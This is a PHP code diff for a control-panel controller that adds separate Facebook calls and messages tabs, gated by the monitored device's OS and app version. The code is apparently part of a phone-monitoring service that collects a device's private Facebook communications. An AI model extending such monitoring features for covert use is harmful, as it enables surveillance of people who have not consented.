@@ -25,18 +25,29 @@ class Facebook extends BaseModuleController
         if ($this->getRequest()->isAjax()) {
             $dataTableRequest = new \System\DataTableRequest($this->di);
 
-            $data = $facebookModel->getDataTableData(
-                    $this->di['devId'], $dataTableRequest->buildResult(array('account', 'timeFrom', 'timeTo'))
-            );
-            $this->checkDisplayLength($dataTableRequest->getDisplayLength());
-            $this->makeJSONResponse($data);
+            if (isset($this->params['tab']) && $this->params['tab'] == 'calls') {
+                $data = $facebookModel->getCallsDataTableData(
+                        $this->di['devId'], $dataTableRequest->buildResult(array('account', 'timeFrom', 'timeTo'))
+                );
+                $this->checkDisplayLength($dataTableRequest->getDisplayLength());
+                $this->makeJSONResponse($data);
+            } else {
+                $data = $facebookModel->getMessagesDataTableData(
+                        $this->di['devId'], $dataTableRequest->buildResult(array('account', 'timeFrom', 'timeTo'))
+                );
+                $this->checkDisplayLength($dataTableRequest->getDisplayLength());
+                $this->makeJSONResponse($data);
+            }
         }
 
+        $this->view->callsTab = ($this->di['currentDevice']['os'] === 'android' && $this->di['currentDevice']['app_version'] >= 9) ||
+                ($this->di['currentDevice']['os'] === 'ios' && $this->di['currentDevice']['app_version'] >= 7);
+        
         if ($this->view->paid) {
             $this->view->accounts = $facebookModel->getAccountsList($this->di['devId']);
         }
 
-        $this->setView('cp/facebook.htm');
+        $this->setView('cp/facebook/index.htm');
     }
 
     public function listAction()
@@ -61,7 +72,7 @@ class Facebook extends BaseModuleController
 
         $this->view->tab = $this->params['tab'];
 
-        $this->setView('cp/facebookList.htm');
+        $this->setView('cp/facebook/list.htm');
     }
 
     protected function postAction()
@@ -71,7 +82,7 @@ class Facebook extends BaseModuleController
 
         $this->view->title = $this->di['t']->_('Facebook Messages');
     }
-    
+
     protected function isModulePaid()
     {
         $devicesLimitations = new Limitations($this->di['db']);
